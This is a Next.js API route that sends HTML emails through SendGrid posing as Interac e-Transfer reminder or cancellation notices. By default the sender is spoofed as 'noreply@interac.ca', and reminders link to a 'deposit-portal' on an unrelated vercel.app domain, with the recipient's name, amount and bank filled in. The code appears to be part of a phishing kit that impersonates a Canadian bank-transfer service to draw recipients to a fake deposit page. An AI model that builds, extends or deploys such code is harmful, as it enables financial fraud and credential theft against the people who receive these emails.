import { type NextRequest, NextResponse } from "next/server"
import { generateInteracEmailHtml } from "@/lib/email-template"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { recipient, recipientName, amount, transferId, bankName, message, timestamp, type } = body

    if (!recipient || !transferId) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    const amountNumber = typeof amount === "string" ? Number.parseFloat(amount) : amount

    const isReminder = type === "reminder"
    const subjectPrefix = isReminder ? "Reminder" : "Cancellation Notice"
    const noticeMessage = isReminder
      ? `This is a reminder that your Interac e-Transfer (${transferId}) of $${amountNumber.toFixed(2)} CAD is still awaiting deposit. Please complete your deposit at your earliest convenience.`
      : `Your Interac e-Transfer (${transferId}) of $${amountNumber.toFixed(2)} CAD has been cancelled by the sender. If you have any questions, please contact your financial institution.`

    const depositUrl = `${process.env.NEXT_PUBLIC_APP_URL || "https://v0-interacadvancededition-git-main-nykeygpts-projects.vercel.app"}/deposit-portal?transferId=${transferId}&amount=${amount}&recipient=${encodeURIComponent(recipient)}&recipientName=${encodeURIComponent(recipientName || "")}&bankName=${encodeURIComponent(bankName || "Banking System")}&message=${encodeURIComponent(message || "")}&timestamp=${timestamp}`

    const html = generateInteracEmailHtml({
      amount: amountNumber,
      senderName: "Interac e-Transfer",
      recipientName: recipientName || recipient,
      securityQuestion: isReminder ? "Deposit Reminder" : "Transaction Cancelled",
      securityAnswer: isReminder ? "Please complete your deposit" : "This transfer has been cancelled",
      message: noticeMessage,
      depositLink: isReminder ? depositUrl : "https://v0-interacadvancededition-git-main-nykeygpts-projects.vercel.app",
      transferId: transferId,
      institution: bankName || "Banking System",
    })

    const response = await fetch("https://api.sendgrid.com/v3/mail/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${process.env.SENDGRID_API_KEY}`,
      },
      body: JSON.stringify({
        personalizations: [
          {
            to: [{ email: recipient, name: recipientName || recipient }],
          },
        ],
        from: {
          email: process.env.SENDGRID_FROM_EMAIL || "noreply@interac.ca",
          name: "Interac e-Transfer",
        },
        subject: `${subjectPrefix} - Transfer ${transferId}`,
        content: [{ type: "text/html", value: html }],
      }),
    })

    if (!response.ok) {
      const errorText = await response.text()
      console.error("SendGrid error:", errorText)
      return NextResponse.json({ error: "Failed to send email", details: errorText }, { status: 500 })
    }

    return NextResponse.json({ success: true, type })
  } catch (error) {
    console.error("Error sending cancellation email:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
